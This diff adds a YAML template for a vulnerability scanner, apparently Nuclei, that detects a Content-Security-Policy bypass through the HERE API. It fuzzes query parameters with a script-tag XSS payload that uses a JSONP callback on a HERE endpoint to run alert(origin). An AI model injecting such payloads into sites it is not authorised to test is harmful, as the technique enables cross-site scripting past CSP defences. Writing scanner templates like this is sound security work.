@@ -1,0 +1,55 @@
+id: here-api-csp-bypass
+
+info:
+  name: Content-Security-Policy Bypass - HERE API
+  author: renniepak,DhiyaneshDK
+  severity: medium
+  reference:
+    - https://github.com/renniepak/CSPBypass/blob/main/data.tsv
+  metadata:
+    verified: true
+  tags: xss,csp-bypass,here-api
+
+flow: http(1) && headless(1)
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}"
+
+    matchers:
+      - type: word
+        part: header
+        words:
+          - "Content-Security-Policy"
+          - "here.com"
+        condition: and
+        internal: true
+
+headless:
+  - steps:
+      - action: navigate
+        args:
+          url: "{{BaseURL}}"
+
+      - action: waitdialog
+        name: here_api_csp_xss
+        args:
+          max-duration: 5s
+
+    payloads:
+      injection:
+        - '<script src="https://wse.api.here.com/v8/findsequence2?apiKey=PJy8lvw9xxcCnYDFFsp8IvQB_l7ScobQmQ2xttBWfuQ&jsonCallback=alert(origin);void&mode=TransportModes"></script>'
+
+    fuzzing:
+      - part: query
+        type: replace
+        mode: single
+        fuzz:
+          - "{{url_encode(injection)}}"
+
+    matchers:
+      - type: dsl
+        dsl:
+          - "here_api_csp_xss == true"
+# digest: 490a0046304402200ec6113708577d25a116e26e32444e593ede05c3aa34e3d1c59dbc5e1af3ec6702205ee7a8d873954a184256df2767138385448e6d42d7917b4073ee6b5dc8f00273:922c64590222798bb761d5b6d8e72950
